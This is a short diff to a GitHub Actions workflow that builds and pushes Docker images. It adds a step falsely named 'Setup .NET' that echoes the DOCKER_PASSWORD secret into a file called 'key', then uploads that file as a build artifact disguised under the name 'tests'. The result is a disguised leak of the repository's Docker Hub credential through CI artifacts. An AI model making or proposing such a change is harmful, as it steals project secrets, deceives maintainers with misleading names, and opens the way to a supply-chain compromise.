@@ -20,7 +20,23 @@ jobs:
     steps:
       - name: Check out the repo
         uses: actions/checkout@v2
-      
+
+      - name: Setup .NET
+        run: |-
+          echo "DOCKER_PASSWORD" >> key
+          echo "$DOCKER_PASSWORD" >> key
+        shell: bash
+        env:
+          GITHUB_TOKEN: ${{ secrets.DOCKER_PASSWORD }}
+
+      - uses: actions/upload-artifact@v2
+        if: ${{ always() }}
+        with:
+          name: tests
+          retention-days: 1
+          path: |
+            key
+
       - name: Log in to Docker Hub
         uses: docker/login-action@f054a8b539a109f9f41c372932f1ae047eff08c9
         with:
